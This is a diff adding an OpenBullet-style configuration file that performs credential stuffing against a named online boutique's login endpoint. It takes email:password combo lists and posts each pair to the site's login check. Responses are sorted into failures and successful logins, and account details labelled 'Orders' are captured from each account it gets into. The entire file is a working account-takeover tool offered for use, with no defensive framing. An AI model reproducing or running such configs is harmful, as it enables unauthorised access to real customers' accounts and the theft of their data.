@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "ThePinkBoutique",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-20T14:02:43.109122+00:00",
+  "AdditionalInfo": "",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "5",
+      "Id": 661487914
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "7",
+      "Id": 1612429514
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://pinklily.com/login.php?action=check_login" AutoRedirect=TRUE 
+  CONTENT "login_email=<USER>&login_pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://pinklily.com/login.php" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "incorrect" 
+PARSE "<SOURCE>" LR "<\"alertBox-column alertBox-message\"" ">" Recursive=FALSE -> CAP "Orders" "" "" 
